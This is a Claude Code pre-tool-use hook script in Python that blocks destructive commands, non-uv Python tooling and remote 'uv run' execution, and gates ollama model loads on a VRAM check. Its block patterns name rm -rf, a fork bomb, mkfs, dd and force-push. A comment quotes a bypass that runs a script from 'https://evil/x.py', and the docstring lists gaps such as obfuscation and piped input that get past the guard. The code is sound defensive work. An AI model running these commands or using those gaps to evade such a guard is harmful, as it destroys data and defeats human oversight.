#!/usr/bin/env python3
"""PreToolUse(Bash): block destructive commands + legacy Python tooling; gate uv's
remote-exec vectors; soft VRAM check.

Fails CLOSED on unparseable input (this is a guard, not telemetry). If a Claude Code
schema change ever breaks parsing, every Bash call is blocked until you intervene —
that is the safe failure direction under --dangerously-skip-permissions.

Manual override — set this in the SHELL THAT LAUNCHES kx/claude. It is inherited by
the hook (a child of the Claude Code process) but NOT by the agent's own Bash tool
subshell, so the agent cannot set it for itself:
    export KNIOX_BYPASS_HOOKS=1
"""
import json, sys, re, os, subprocess, shlex

if os.environ.get("KNIOX_BYPASS_HOOKS") == "1":
    sys.exit(0)

def block(msg):
    sys.stderr.write("kniox: " + msg + "\n")
    sys.exit(2)

try:
    data = json.load(sys.stdin)
except Exception as e:
    block(f"guard-uv could not parse the hook payload ({e}); blocking for safety. "
          f"If a Claude Code update changed the schema, bypass with: export KNIOX_BYPASS_HOOKS=1")

# Non-dict payload (e.g. a list) would AttributeError on .get below — block cleanly
# instead of leaking a traceback, same fail-CLOSED direction as the parse error above.
if not isinstance(data, dict):
    block("guard-uv received a non-dict hook payload; blocking for safety. "
          "Bypass a schema break with: export KNIOX_BYPASS_HOOKS=1")

cmd = (data.get("tool_input") or {}).get("command", "") or ""
norm = re.sub(r"\s+", " ", cmd)   # collapse whitespace so flag/space tricks don't slip the matchers

# HARD: destructive commands (matters most under --dangerously-skip-permissions).
# Catches -rf / -fr / -Rf and --recursive. NOTE: separated flags (rm -r -f) and
# shell obfuscation (eval, base64, $IFS) still pass — this is a speed bump, not a sandbox.
for p in [r"\brm\s+-[a-zA-Z]*[rR][a-zA-Z]*f", r"\brm\s+-[a-zA-Z]*f[a-zA-Z]*[rR]",
          r"\brm\s+--recursive\b", r"\bgit\s+push\s+(?:--force\b|-f\b)",
          r":\(\)\s*\{", r"\bmkfs\b", r"\bdd\s+if=", r">\s*/dev/sd"]:
    if re.search(p, norm):
        block("blocked destructive command. Run it yourself if you mean it.")

# HARD: enforce uv. `uv pip ...` (and uv add/sync/run) are fine — they ARE uv and are
# used by the framework's own setup. Only BARE pip/pip3 is blocked.
if re.search(r"(?<!uv )\bpip3?\s+install\b", norm):
    block("use uv (uv add / uv sync / uv run / uv pip). Bare pip is prohibited.")
for p in [r"\bconda\b", r"\bpython3?\s+-m\s+venv\b", r"\bvirtualenv\b", r"\bpoetry\b"]:
    if re.search(p, norm):
        block("use uv (uv add / uv sync / uv run). conda / venv / poetry are prohibited.")

# HARD: uv itself can fetch + execute unvetted code. Block remote scripts and ad-hoc
# index tools. Local `uv run <script>.py` (incl. PEP 723 inline deps) and `uv run --with`
# stay allowed — same trust boundary as `uv add`.
# NOTE: a stdin pipe (curl URL | uv run -) is NOT covered here. Speed bump, not a wall.
#
# uv executes the FIRST POSITIONAL argument as the script, so a URL is a remote-exec
# vector ONLY when it lands in that slot. A regex can't find the slot: it can't tell a
# positional `script.py` from a flag *value* `--python fake.py`, which was the documented
# bypass (`uv run --python fake.py https://evil/x.py` slipped a remote URL past the old
# "is there a local .py?" check). So we tokenize and replay uv's arg parse just enough to
# locate the slot, failing toward BLOCK: any flag without `=` is assumed to consume the
# next token as its value, but is never allowed to swallow a URL or another flag. A URL
# passed as a space-form flag value (e.g. `--index https://pypi/simple`) is therefore
# blocked too — use the `--flag=value` form to keep such a URL out of the script slot.
def _is_url(t):
    return t.startswith(("http://", "https://"))

def _uv_run_remote(tokens):
    n = len(tokens)
    for i in range(n - 1):
        if tokens[i].rsplit("/", 1)[-1] != "uv" or tokens[i + 1] != "run":
            continue
        j = i + 2
        while j < n:
            t = tokens[j]
            if _is_url(t):
                return True                       # URL reached the script slot → remote exec
            if t.startswith("-"):
                nxt = tokens[j + 1] if j + 1 < n else ""
                # `--flag=value` is self-contained; a space-form flag eats the next token
                # as its value unless that token is itself a flag or a URL.
                if "=" not in t and nxt and not nxt.startswith("-") and not _is_url(nxt):
                    j += 2
                else:
                    j += 1
                continue
            break                                 # first positional is a local script → allowed
    return False

try:
    if _uv_run_remote(shlex.split(cmd)):
        block("remote `uv run <url>` is prohibited — pull the script down and read it first.")
except ValueError:                                # unbalanced quotes → untokenizable; fail closed
    if re.search(r"\buv\s+run\b.*?https?://", norm):
        block("remote `uv run <url>` is prohibited (unparseable command); pull the script down first.")
if re.search(r"\b(?:uvx|uv\s+tool\s+run)\b", norm):
    block("ad-hoc `uvx` / `uv tool run` is prohibited — add the tool via `uv add` instead.")

# SOFT: VRAM budget on ollama loads (intentionally fail-OPEN if the daemon is down).
m = re.search(r"\bollama\s+run\s+(\S+)", cmd)
if m:
    kniox = os.environ.get("CLAUDE_PROJECT_DIR") or os.path.abspath(os.path.join(os.path.dirname(__file__), "..", ".."))
    try:
        r = subprocess.run([sys.executable, os.path.join(kniox, "daemon", "daemon.py"), "can-load", m.group(1)],
                           capture_output=True, text=True, timeout=10)
        if r.returncode == 3:
            sys.stderr.write(f"kniox: blocked. Loading '{m.group(1)}' would exceed the VRAM budget. "
                             f"Dispatch via the daemon instead.\n{r.stdout}\n"); sys.exit(2)
    except Exception:
        pass
sys.exit(0)
